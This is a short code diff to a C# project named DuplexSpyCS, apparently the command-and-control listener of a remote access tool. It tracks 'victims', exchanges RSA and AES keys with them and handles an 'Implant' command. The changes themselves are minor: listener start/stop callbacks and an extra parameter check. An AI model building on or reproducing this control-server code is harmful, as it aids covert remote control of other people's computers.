@@ -117,6 +117,8 @@ namespace DuplexSpyCS
             socket.BeginAccept(new AsyncCallback(AcceptCallBack), socket);
 
             m_bIslistening = true;
+            
+            fnOnListenerStarted(this);
         }
 
         //STOP LISTEN
@@ -150,6 +152,8 @@ namespace DuplexSpyCS
             m_lsVictim.Clear();
 
             m_bIslistening = false;
+
+            fnOnListenerStopped(this);
         }
 
         /// <summary>
@@ -208,7 +212,9 @@ namespace DuplexSpyCS
                 v.key_pairs = (key_pairs[0], key_pairs[1]);
                 string b64_PublicKey = clsCrypto.b64E2Str(v.key_pairs.public_key);
                 v.Send(1, 0, b64_PublicKey); //PARAM: 1 -> RSA PUBLIC KEY
+
                 sql_conn.WriteKeyExchange(v, "Sent RSA public key");
+
                 do
                 {
                     static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
@@ -323,7 +329,7 @@ namespace DuplexSpyCS
                                     });
                                 }
                             }
-                            else if (dsp.Command == 3) //Implant
+                            else if (dsp.Command == 3 && dsp.Param == 0) //Implant
                             {
                                 byte[] abEncData = dsp.GetMsg().msg;
                                 string szDecData = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abEncData)), v._AES.key, v._AES.iv);
